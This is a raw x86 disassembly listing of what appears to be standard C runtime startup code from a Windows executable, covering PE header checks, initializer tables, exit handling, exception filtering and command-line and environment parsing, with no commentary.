  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
  424496:	mov    edx,DWORD PTR [esi+0x8]
  424499:	mov    DWORD PTR ds:0x45dad4,edx
  42449f:	mov    esi,DWORD PTR [esi+0xc]
  4244a2:	and    esi,0x7fff
  4244a8:	mov    DWORD PTR ds:0x45dac8,esi
  4244ae:	cmp    ecx,0x2
  4244b1:	je     0x4244bf
  4244b3:	or     esi,0x8000
  4244b9:	mov    DWORD PTR ds:0x45dac8,esi
  4244bf:	shl    eax,0x8
  4244c2:	add    eax,edx
  4244c4:	mov    ds:0x45dacc,eax
  4244c9:	xor    esi,esi
  4244cb:	push   esi
  4244cc:	mov    edi,DWORD PTR ds:0x429024
  4244d2:	call   edi
  4244d4:	cmp    WORD PTR [eax],0x5a4d
  4244d9:	jne    0x4244fa
  4244db:	mov    ecx,DWORD PTR [eax+0x3c]
  4244de:	add    ecx,eax
  4244e0:	cmp    DWORD PTR [ecx],0x4550
  4244e6:	jne    0x4244fa
  4244e8:	movzx  eax,WORD PTR [ecx+0x18]
  4244ec:	cmp    eax,0x10b
  4244f1:	je     0x424512
  4244f3:	cmp    eax,0x20b
  4244f8:	je     0x4244ff
  4244fa:	mov    DWORD PTR [ebp-0x1c],esi
  4244fd:	jmp    0x424526
  4244ff:	cmp    DWORD PTR [ecx+0x84],0xe
  424506:	jbe    0x4244fa
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xf8],esi
  424510:	jmp    0x424520
  424512:	cmp    DWORD PTR [ecx+0x74],0xe
  424516:	jbe    0x4244fa
  424518:	xor    eax,eax
  42451a:	cmp    DWORD PTR [ecx+0xe8],esi
  424520:	setne  al
  424523:	mov    DWORD PTR [ebp-0x1c],eax
  424526:	push   0x1
  424528:	call   0x4252fd
  42452d:	pop    ecx
  42452e:	test   eax,eax
  424530:	jne    0x42453a
  424532:	push   0x1c
  424534:	call   0x42443b
  424539:	pop    ecx
  42453a:	call   0x425274
  42453f:	test   eax,eax
  424541:	jne    0x42454b
  424543:	push   0x10
  424545:	call   0x42443b
  42454a:	pop    ecx
  42454b:	call   0x42515d
  424550:	mov    DWORD PTR [ebp-0x4],esi
  424553:	call   0x424f5f
  424558:	test   eax,eax
  42455a:	jge    0x424564
  42455c:	push   0x1b
  42455e:	call   0x424416
  424563:	pop    ecx
  424564:	call   DWORD PTR ds:0x429054
  42456a:	mov    ds:0x45e274,eax
  42456f:	call   0x424e3d
  424574:	mov    ds:0x45dab4,eax
  424579:	call   0x424d9b
  42457e:	test   eax,eax
  424580:	jge    0x42458a
  424582:	push   0x8
  424584:	call   0x424416
  424589:	pop    ecx
  42458a:	call   0x424b68
  42458f:	test   eax,eax
  424591:	jge    0x42459b
  424593:	push   0x9
  424595:	call   0x424416
  42459a:	pop    ecx
  42459b:	call   0x424673
  4245a0:	mov    DWORD PTR [ebp-0x20],eax
  4245a3:	cmp    eax,esi
  4245a5:	je     0x4245ae
  4245a7:	push   eax
  4245a8:	call   0x424416
  4245ad:	pop    ecx
  4245ae:	mov    DWORD PTR [ebp-0x38],esi
  4245b1:	lea    eax,[ebp-0x64]
  4245b4:	push   eax
  4245b5:	call   DWORD PTR ds:0x429050
  4245bb:	call   0x424aff
  4245c0:	mov    DWORD PTR [ebp-0x68],eax
  4245c3:	test   BYTE PTR [ebp-0x38],0x1
  4245c7:	je     0x4245cf
  4245c9:	movzx  eax,WORD PTR [ebp-0x34]
  4245cd:	jmp    0x4245d2
  4245cf:	push   0xa
  4245d1:	pop    eax
  4245d2:	push   eax
  4245d3:	push   DWORD PTR [ebp-0x68]
  4245d6:	push   esi
  4245d7:	push   esi
  4245d8:	call   edi
  4245da:	push   eax
  4245db:	call   0x422f90
  4245e0:	mov    edi,eax
  4245e2:	mov    DWORD PTR [ebp-0x6c],edi
  4245e5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245e8:	jne    0x4245f0
  4245ea:	push   edi
  4245eb:	call   0x4247ab
  4245f0:	call   0x4247cd
  4245f5:	jmp    0x424622
  4245f7:	mov    eax,DWORD PTR [ebp-0x14]
  4245fa:	mov    ecx,DWORD PTR [eax]
  4245fc:	mov    ecx,DWORD PTR [ecx]
  4245fe:	mov    DWORD PTR [ebp-0x70],ecx
  424601:	push   eax
  424602:	push   ecx
  424603:	call   0x42499b
  424608:	pop    ecx
  424609:	pop    ecx
  42460a:	ret    
  42460b:	mov    esp,DWORD PTR [ebp-0x18]
  42460e:	mov    edi,DWORD PTR [ebp-0x70]
  424611:	cmp    DWORD PTR [ebp-0x1c],0x0
  424615:	jne    0x42461d
  424617:	push   edi
  424618:	call   0x4247bc
  42461d:	call   0x4247dc
  424622:	or     DWORD PTR [ebp-0x4],0xffffffff
  424626:	mov    eax,edi
  424628:	lea    esp,[ebp-0x7c]
  42462b:	call   0x42538b
  424630:	ret    
  424631:	push   0x429244
  424636:	call   DWORD PTR ds:0x429024
  42463c:	test   eax,eax
  42463e:	je     0x424656
  424640:	push   0x429234
  424645:	push   eax
  424646:	call   DWORD PTR ds:0x429020
  42464c:	test   eax,eax
  42464e:	je     0x424656
  424650:	push   DWORD PTR [esp+0x4]
  424654:	call   eax
  424656:	push   DWORD PTR [esp+0x4]
  42465a:	call   DWORD PTR ds:0x42905c
  424660:	int3   
  424661:	push   0x8
  424663:	call   0x42550f
  424668:	pop    ecx
  424669:	ret    
  42466a:	push   0x8
  42466c:	call   0x42547b
  424671:	pop    ecx
  424672:	ret    
  424673:	mov    eax,ds:0x45e270
  424678:	test   eax,eax
  42467a:	je     0x42467e
  42467c:	call   eax
  42467e:	push   esi
  42467f:	push   edi
  424680:	mov    ecx,0x42b00c
  424685:	mov    edi,0x42b018
  42468a:	xor    eax,eax
  42468c:	cmp    ecx,edi
  42468e:	mov    esi,ecx
  424690:	jae    0x4246a9
  424692:	test   eax,eax
  424694:	jne    0x4246d5
  424696:	mov    ecx,DWORD PTR [esi]
  424698:	test   ecx,ecx
  42469a:	je     0x42469e
  42469c:	call   ecx
  42469e:	add    esi,0x4
  4246a1:	cmp    esi,edi
  4246a3:	jb     0x424692
  4246a5:	test   eax,eax
  4246a7:	jne    0x4246d5
  4246a9:	push   0x4251a1
  4246ae:	call   0x425620
  4246b3:	mov    esi,0x42b000
  4246b8:	mov    eax,esi
  4246ba:	mov    edi,0x42b008
  4246bf:	cmp    eax,edi
  4246c1:	pop    ecx
  4246c2:	jae    0x4246d3
  4246c4:	mov    eax,DWORD PTR [esi]
  4246c6:	test   eax,eax
  4246c8:	je     0x4246cc
  4246ca:	call   eax
  4246cc:	add    esi,0x4
  4246cf:	cmp    esi,edi
  4246d1:	jb     0x4246c4
  4246d3:	xor    eax,eax
  4246d5:	pop    edi
  4246d6:	pop    esi
  4246d7:	ret    
  4246d8:	push   ebp
  4246d9:	mov    ebp,esp
  4246db:	push   esi
  4246dc:	push   edi
  4246dd:	push   0x8
  4246df:	call   0x42550f
  4246e4:	xor    esi,esi
  4246e6:	inc    esi
  4246e7:	cmp    DWORD PTR ds:0x45db04,esi
  4246ed:	pop    ecx
  4246ee:	jne    0x424700
  4246f0:	push   DWORD PTR [ebp+0x8]
  4246f3:	call   DWORD PTR ds:0x429064
  4246f9:	push   eax
  4246fa:	call   DWORD PTR ds:0x429060
  424700:	cmp    DWORD PTR [ebp+0xc],0x0
  424704:	mov    al,BYTE PTR [ebp+0x10]
  424707:	mov    DWORD PTR ds:0x45db00,esi
  42470d:	mov    ds:0x45dafc,al
  424712:	jne    0x424766
  424714:	mov    ecx,DWORD PTR ds:0x45e268
  42471a:	test   ecx,ecx
  42471c:	je     0x424747
  42471e:	mov    eax,ds:0x45e264
  424723:	sub    eax,0x4
  424726:	cmp    eax,ecx
  424728:	jmp    0x424740
  42472a:	mov    eax,DWORD PTR [eax]
  42472c:	test   eax,eax
  42472e:	je     0x424732
  424730:	call   eax
  424732:	mov    eax,ds:0x45e264
  424737:	sub    eax,0x4
  42473a:	cmp    eax,DWORD PTR ds:0x45e268
  424740:	mov    ds:0x45e264,eax
  424745:	jae    0x42472a
  424747:	mov    eax,0x42b01c
  42474c:	mov    esi,0x42b020
  424751:	cmp    eax,esi
  424753:	mov    edi,eax
  424755:	jae    0x424766
  424757:	mov    eax,DWORD PTR [edi]
  424759:	test   eax,eax
  42475b:	je     0x42475f
  42475d:	call   eax
  42475f:	add    edi,0x4
  424762:	cmp    edi,esi
  424764:	jb     0x424757
  424766:	mov    eax,0x42b024
  42476b:	mov    esi,0x42b028
  424770:	cmp    eax,esi
  424772:	mov    edi,eax
  424774:	jae    0x424785
  424776:	mov    eax,DWORD PTR [edi]
  424778:	test   eax,eax
  42477a:	je     0x42477e
  42477c:	call   eax
  42477e:	add    edi,0x4
  424781:	cmp    edi,esi
  424783:	jb     0x424776
  424785:	cmp    DWORD PTR [ebp+0x10],0x0
  424789:	pop    edi
  42478a:	pop    esi
  42478b:	je     0x424796
  42478d:	push   0x8
  42478f:	call   0x42547b
  424794:	jmp    0x4247a8
  424796:	push   DWORD PTR [ebp+0x8]
  424799:	mov    DWORD PTR ds:0x45db04,0x1
  4247a3:	call   0x424631
  4247a8:	pop    ecx
  4247a9:	pop    ebp
  4247aa:	ret    
  4247ab:	push   0x0
  4247ad:	push   0x0
  4247af:	push   DWORD PTR [esp+0xc]
  4247b3:	call   0x4246d8
  4247b8:	add    esp,0xc
  4247bb:	ret    
  4247bc:	push   0x0
  4247be:	push   0x1
  4247c0:	push   DWORD PTR [esp+0xc]
  4247c4:	call   0x4246d8
  4247c9:	add    esp,0xc
  4247cc:	ret    
  4247cd:	push   0x1
  4247cf:	push   0x0
  4247d1:	push   0x0
  4247d3:	call   0x4246d8
  4247d8:	add    esp,0xc
  4247db:	ret    
  4247dc:	push   0x1
  4247de:	push   0x1
  4247e0:	push   0x0
  4247e2:	call   0x4246d8
  4247e7:	add    esp,0xc
  4247ea:	ret    
  4247eb:	push   ebp
  4247ec:	mov    ebp,esp
  4247ee:	sub    esp,0x10c
  4247f4:	mov    eax,ds:0x45d430
  4247f9:	xor    eax,DWORD PTR [ebp+0x4]
  4247fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ff:	push   ebx
  424800:	push   esi
  424801:	mov    DWORD PTR [ebp-0x4],eax
  424804:	xor    edx,edx
  424806:	push   edi
  424807:	xor    eax,eax
  424809:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424810:	je     0x424818
  424812:	inc    eax
  424813:	cmp    eax,0x12
  424816:	jb     0x424809
  424818:	mov    esi,eax
  42481a:	shl    esi,0x3
  42481d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424823:	jne    0x42494c
  424829:	mov    eax,ds:0x45dabc
  42482e:	cmp    eax,0x1
  424831:	je     0x424927
  424837:	cmp    eax,edx
  424839:	jne    0x424848
  42483b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424842:	je     0x424927
  424848:	cmp    ecx,0xfc
  42484e:	je     0x42494c
  424854:	push   0x104
  424859:	lea    eax,[ebp-0x10c]
  42485f:	push   eax
  424860:	push   edx
  424861:	mov    BYTE PTR [ebp-0x8],dl
  424864:	call   DWORD PTR ds:0x42906c
  42486a:	test   eax,eax
  42486c:	jne    0x424881
  42486e:	lea    eax,[ebp-0x10c]
  424874:	push   0x42959c
  424879:	push   eax
  42487a:	call   0x425730
  42487f:	pop    ecx
  424880:	pop    ecx
  424881:	lea    eax,[ebp-0x10c]
  424887:	push   eax
  424888:	lea    edi,[ebp-0x10c]
  42488e:	call   0x425960
  424893:	inc    eax
  424894:	cmp    eax,0x3c
  424897:	pop    ecx
  424898:	jbe    0x4248c3
  42489a:	lea    eax,[ebp-0x10c]
  4248a0:	push   eax
  4248a1:	call   0x425960
  4248a6:	mov    edi,eax
  4248a8:	lea    eax,[ebp-0x10c]
  4248ae:	sub    eax,0x3b
  4248b1:	push   0x3
  4248b3:	add    edi,eax
  4248b5:	push   0x429598
  4248ba:	push   edi
  4248bb:	call   0x425830
  4248c0:	add    esp,0x10
  4248c3:	push   edi
  4248c4:	call   0x425960
  4248c9:	push   DWORD PTR [esi+0x45d1cc]
  4248cf:	mov    ebx,eax
  4248d1:	call   0x425960
  4248d6:	lea    eax,[ebx+eax*1+0x1c]
  4248da:	pop    ecx
  4248db:	add    eax,0x3
  4248de:	pop    ecx
  4248df:	and    eax,0xfffffffc
  4248e2:	call   0x4253a0
  4248e7:	mov    ebx,esp
  4248e9:	push   0x42957c
  4248ee:	push   ebx
  4248ef:	call   0x425730
  4248f4:	push   edi
  4248f5:	push   ebx
  4248f6:	call   0x425740
  4248fb:	push   0x429578
  424900:	push   ebx
  424901:	call   0x425740
  424906:	push   DWORD PTR [esi+0x45d1cc]
  42490c:	push   ebx
  42490d:	call   0x425740
  424912:	push   0x12010
  424917:	push   0x429550
  42491c:	push   ebx
  42491d:	call   0x425632
  424922:	add    esp,0x2c
  424925:	jmp    0x42494c
  424927:	push   edx
  424928:	lea    eax,[ebp+0x8]
  42492b:	push   eax
  42492c:	lea    esi,[esi+0x45d1cc]
  424932:	push   DWORD PTR [esi]
  424934:	call   0x425960
  424939:	pop    ecx
  42493a:	push   eax
  42493b:	push   DWORD PTR [esi]
  42493d:	push   0xfffffff4
  42493f:	call   DWORD PTR ds:0x429068
  424945:	push   eax
  424946:	call   DWORD PTR ds:0x42902c
  42494c:	lea    esp,[ebp-0x118]
  424952:	mov    ecx,DWORD PTR [ebp-0x4]
  424955:	xor    ecx,DWORD PTR [ebp+0x4]
  424958:	call   0x425a1c
  42495d:	pop    edi
  42495e:	pop    esi
  42495f:	pop    ebx
  424960:	leave  
  424961:	ret    
  424962:	mov    eax,ds:0x45dabc
  424967:	cmp    eax,0x1
  42496a:	je     0x424979
  42496c:	test   eax,eax
  42496e:	jne    0x42499a
  424970:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424977:	jne    0x42499a
  424979:	push   0xfc
  42497e:	call   0x4247eb
  424983:	mov    eax,ds:0x45db08
  424988:	test   eax,eax
  42498a:	pop    ecx
  42498b:	je     0x42498f
  42498d:	call   eax
  42498f:	push   0xff
  424994:	call   0x4247eb
  424999:	pop    ecx
  42499a:	ret    
  42499b:	push   ebp
  42499c:	mov    ebp,esp
  42499e:	push   ecx
  42499f:	push   ebx
  4249a0:	push   esi
  4249a1:	push   edi
  4249a2:	call   0x425203
  4249a7:	mov    edi,DWORD PTR [ebp+0x8]
  4249aa:	mov    esi,eax
  4249ac:	mov    edx,DWORD PTR [esi+0x54]
  4249af:	mov    eax,ds:0x45d2dc
  4249b4:	mov    ecx,edx
  4249b6:	cmp    DWORD PTR [ecx],edi
  4249b8:	je     0x4249c7
  4249ba:	lea    ebx,[eax+eax*2]
  4249bd:	add    ecx,0xc
  4249c0:	lea    ebx,[edx+ebx*4]
  4249c3:	cmp    ecx,ebx
  4249c5:	jb     0x4249b6
  4249c7:	lea    eax,[eax+eax*2]
  4249ca:	lea    eax,[edx+eax*4]
  4249cd:	cmp    ecx,eax
  4249cf:	jae    0x4249d5
  4249d1:	cmp    DWORD PTR [ecx],edi
  4249d3:	je     0x4249d7
  4249d5:	xor    ecx,ecx
  4249d7:	test   ecx,ecx
  4249d9:	je     0x424af1
  4249df:	mov    ebx,DWORD PTR [ecx+0x8]
  4249e2:	test   ebx,ebx
  4249e4:	mov    DWORD PTR [ebp+0x8],ebx
  4249e7:	je     0x424af1
  4249ed:	cmp    ebx,0x5
  4249f0:	jne    0x4249fe
  4249f2:	and    DWORD PTR [ecx+0x8],0x0
  4249f6:	xor    eax,eax
  4249f8:	inc    eax
  4249f9:	jmp    0x424afa
  4249fe:	cmp    ebx,0x1
  424a01:	je     0x424aec
  424a07:	mov    eax,DWORD PTR [esi+0x58]
  424a0a:	mov    DWORD PTR [ebp-0x4],eax
  424a0d:	mov    eax,DWORD PTR [ebp+0xc]
  424a10:	mov    DWORD PTR [esi+0x58],eax
  424a13:	mov    eax,DWORD PTR [ecx+0x4]
  424a16:	cmp    eax,0x8
  424a19:	jne    0x424ade
  424a1f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a25:	mov    eax,ds:0x45d2d4
  424a2a:	add    eax,edx
  424a2c:	cmp    edx,eax
  424a2e:	jge    0x424a57
  424a30:	lea    eax,[edx+edx*2]
  424a33:	shl    eax,0x2
  424a36:	mov    edi,DWORD PTR [esi+0x54]
  424a39:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a3e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a44:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a4a:	inc    edx
  424a4b:	add    ebx,edi
  424a4d:	add    eax,0xc
  424a50:	cmp    edx,ebx
  424a52:	jl     0x424a36
  424a54:	mov    ebx,DWORD PTR [ebp+0x8]
  424a57:	mov    ecx,DWORD PTR [ecx]
  424a59:	cmp    ecx,0xc000008e
  424a5f:	mov    edi,DWORD PTR [esi+0x5c]
  424a62:	jne    0x424a6d
  424a64:	mov    DWORD PTR [esi+0x5c],0x83
  424a6b:	jmp    0x424ad1
  424a6d:	cmp    ecx,0xc0000090
  424a73:	jne    0x424a7e
  424a75:	mov    DWORD PTR [esi+0x5c],0x81
  424a7c:	jmp    0x424ad1
  424a7e:	cmp    ecx,0xc0000091
  424a84:	jne    0x424a8f
  424a86:	mov    DWORD PTR [esi+0x5c],0x84
  424a8d:	jmp    0x424ad1
  424a8f:	cmp    ecx,0xc0000093
  424a95:	jne    0x424aa0
  424a97:	mov    DWORD PTR [esi+0x5c],0x85
  424a9e:	jmp    0x424ad1
  424aa0:	cmp    ecx,0xc000008d
  424aa6:	jne    0x424ab1
  424aa8:	mov    DWORD PTR [esi+0x5c],0x82
  424aaf:	jmp    0x424ad1
  424ab1:	cmp    ecx,0xc000008f
  424ab7:	jne    0x424ac2
  424ab9:	mov    DWORD PTR [esi+0x5c],0x86
  424ac0:	jmp    0x424ad1
  424ac2:	cmp    ecx,0xc0000092
  424ac8:	jne    0x424ad1
  424aca:	mov    DWORD PTR [esi+0x5c],0x8a
  424ad1:	push   DWORD PTR [esi+0x5c]
  424ad4:	push   0x8
  424ad6:	call   ebx
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x5c],edi
  424adc:	jmp    0x424ae5
  424ade:	and    DWORD PTR [ecx+0x8],0x0
  424ae2:	push   eax
  424ae3:	call   ebx
  424ae5:	mov    eax,DWORD PTR [ebp-0x4]
  424ae8:	pop    ecx
  424ae9:	mov    DWORD PTR [esi+0x58],eax
  424aec:	or     eax,0xffffffff
  424aef:	jmp    0x424afa
  424af1:	push   DWORD PTR [ebp+0xc]
  424af4:	call   DWORD PTR ds:0x429070
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	pop    ebx
  424afd:	leave  
  424afe:	ret    
  424aff:	cmp    DWORD PTR ds:0x45e26c,0x0
  424b06:	jne    0x424b0d
  424b08:	call   0x425f3c
  424b0d:	push   esi
  424b0e:	mov    esi,DWORD PTR ds:0x45e274
  424b14:	test   esi,esi
  424b16:	jne    0x424b1f
  424b18:	mov    esi,0x4295b3
  424b1d:	jmp    0x424b64
  424b1f:	mov    al,BYTE PTR [esi]
  424b21:	cmp    al,0x22
  424b23:	jne    0x424b4d
  424b25:	inc    esi
  424b26:	mov    al,BYTE PTR [esi]
  424b28:	cmp    al,0x22
  424b2a:	je     0x424b5d
  424b2c:	test   al,al
  424b2e:	je     0x424b46
  424b30:	movzx  eax,al
  424b33:	push   eax
  424b34:	call   0x425a5b
  424b39:	test   eax,eax
  424b3b:	pop    ecx
  424b3c:	je     0x424b3f
  424b3e:	inc    esi
  424b3f:	inc    esi
  424b40:	mov    al,BYTE PTR [esi]
  424b42:	cmp    al,0x22
  424b44:	jne    0x424b2c
  424b46:	cmp    BYTE PTR [esi],0x22
  424b49:	jne    0x424b5e
  424b4b:	jmp    0x424b5d
  424b4d:	cmp    al,0x20
  424b4f:	jbe    0x424b5e
  424b51:	inc    esi
  424b52:	cmp    BYTE PTR [esi],0x20
  424b55:	ja     0x424b51
  424b57:	jmp    0x424b5e
  424b59:	cmp    al,0x20
  424b5b:	ja     0x424b64
  424b5d:	inc    esi
  424b5e:	mov    al,BYTE PTR [esi]
  424b60:	test   al,al
  424b62:	jne    0x424b59
  424b64:	mov    eax,esi
  424b66:	pop    esi
  424b67:	ret    
  424b68:	push   ebx
  424b69:	xor    ebx,ebx
  424b6b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b71:	push   esi
  424b72:	push   edi
  424b73:	jne    0x424b7a
  424b75:	call   0x425f3c
  424b7a:	mov    esi,DWORD PTR ds:0x45dab4
  424b80:	xor    edi,edi
  424b82:	cmp    esi,ebx
  424b84:	jne    0x424b98
  424b86:	jmp    0x424bb8
  424b88:	cmp    al,0x3d
  424b8a:	je     0x424b8d
  424b8c:	inc    edi
  424b8d:	push   esi
  424b8e:	call   0x425960
  424b93:	pop    ecx
  424b94:	lea    esi,[esi+eax*1+0x1]
  424b98:	mov    al,BYTE PTR [esi]
  424b9a:	cmp    al,bl
  424b9c:	jne    0x424b88
  424b9e:	lea    eax,[edi*4+0x4]
  424ba5:	push   eax
  424ba6:	call   0x426072
  424bab:	mov    edi,eax
  424bad:	cmp    edi,ebx
  424baf:	pop    ecx
  424bb0:	mov    DWORD PTR ds:0x45dae4,edi
  424bb6:	jne    0x424bbd
  424bb8:	or     eax,0xffffffff
  424bbb:	jmp    0x424c15
  424bbd:	mov    esi,DWORD PTR ds:0x45dab4
  424bc3:	push   ebp
  424bc4:	jmp    0x424bf0
  424bc6:	push   esi
  424bc7:	call   0x425960
  424bcc:	mov    ebp,eax
  424bce:	inc    ebp
  424bcf:	cmp    BYTE PTR [esi],0x3d
  424bd2:	pop    ecx
  424bd3:	je     0x424bee
  424bd5:	push   ebp
  424bd6:	call   0x426072
  424bdb:	cmp    eax,ebx
  424bdd:	pop    ecx
  424bde:	mov    DWORD PTR [edi],eax
  424be0:	je     0x424c19
  424be2:	push   esi
  424be3:	push   eax
  424be4:	call   0x425730
  424be9:	pop    ecx
  424bea:	pop    ecx
  424beb:	add    edi,0x4
  424bee:	add    esi,ebp
  424bf0:	cmp    BYTE PTR [esi],bl
  424bf2:	jne    0x424bc6
  424bf4:	push   DWORD PTR ds:0x45dab4
  424bfa:	call   0x425f5a
  424bff:	mov    DWORD PTR ds:0x45dab4,ebx
  424c05:	mov    DWORD PTR [edi],ebx
  424c07:	mov    DWORD PTR ds:0x45e260,0x1
  424c11:	xor    eax,eax
  424c13:	pop    ecx
  424c14:	pop    ebp
  424c15:	pop    edi
  424c16:	pop    esi
  424c17:	pop    ebx
  424c18:	ret    
  424c19:	push   DWORD PTR ds:0x45dae4
  424c1f:	call   0x425f5a
  424c24:	mov    DWORD PTR ds:0x45dae4,ebx
  424c2a:	or     eax,0xffffffff
  424c2d:	jmp    0x424c13
  424c2f:	push   ebp
  424c30:	mov    ebp,esp
  424c32:	push   ecx
  424c33:	push   ebx
  424c34:	mov    ebx,DWORD PTR [ebp+0xc]
  424c37:	xor    edx,edx
  424c39:	cmp    DWORD PTR [ebp+0x8],edx
  424c3c:	push   edi
  424c3d:	mov    DWORD PTR [esi],edx
  424c3f:	mov    edi,ecx
  424c41:	mov    DWORD PTR [ebx],0x1
  424c47:	je     0x424c52
  424c49:	mov    ecx,DWORD PTR [ebp+0x8]
  424c4c:	add    DWORD PTR [ebp+0x8],0x4
  424c50:	mov    DWORD PTR [ecx],edi
  424c52:	cmp    BYTE PTR [eax],0x22
  424c55:	jne    0x424c65
  424c57:	xor    ecx,ecx
  424c59:	test   edx,edx
  424c5b:	sete   cl
  424c5e:	inc    eax
  424c5f:	mov    edx,ecx
  424c61:	mov    cl,0x22
  424c63:	jmp    0x424c92
  424c65:	inc    DWORD PTR [esi]
  424c67:	test   edi,edi
  424c69:	je     0x424c70
  424c6b:	mov    cl,BYTE PTR [eax]
  424c6d:	mov    BYTE PTR [edi],cl
  424c6f:	inc    edi
  424c70:	mov    cl,BYTE PTR [eax]
  424c72:	movzx  ebx,cl
  424c75:	inc    eax
  424c76:	test   BYTE PTR [ebx+0x45df21],0x4
  424c7d:	je     0x424c8b
  424c7f:	inc    DWORD PTR [esi]
  424c81:	test   edi,edi
  424c83:	je     0x424c8a
  424c85:	mov    bl,BYTE PTR [eax]
  424c87:	mov    BYTE PTR [edi],bl
  424c89:	inc    edi
  424c8a:	inc    eax
  424c8b:	test   cl,cl
  424c8d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c90:	je     0x424cc4
  424c92:	test   edx,edx
  424c94:	jne    0x424c52
  424c96:	cmp    cl,0x20
  424c99:	je     0x424ca0
  424c9b:	cmp    cl,0x9
  424c9e:	jne    0x424c52
  424ca0:	test   edi,edi
  424ca2:	je     0x424ca8
  424ca4:	and    BYTE PTR [edi-0x1],0x0
  424ca8:	and    DWORD PTR [ebp-0x4],0x0
  424cac:	cmp    BYTE PTR [eax],0x0
  424caf:	je     0x424d8b
  424cb5:	mov    cl,BYTE PTR [eax]
  424cb7:	cmp    cl,0x20
  424cba:	je     0x424cc1
  424cbc:	cmp    cl,0x9
  424cbf:	jne    0x424cc7
  424cc1:	inc    eax
  424cc2:	jmp    0x424cb5
  424cc4:	dec    eax
  424cc5:	jmp    0x424ca8
  424cc7:	cmp    BYTE PTR [eax],0x0
  424cca:	je     0x424d8b
  424cd0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cd4:	je     0x424cdf
  424cd6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cd9:	add    DWORD PTR [ebp+0x8],0x4
  424cdd:	mov    DWORD PTR [ecx],edi
  424cdf:	inc    DWORD PTR [ebx]
  424ce1:	xor    ebx,ebx
  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
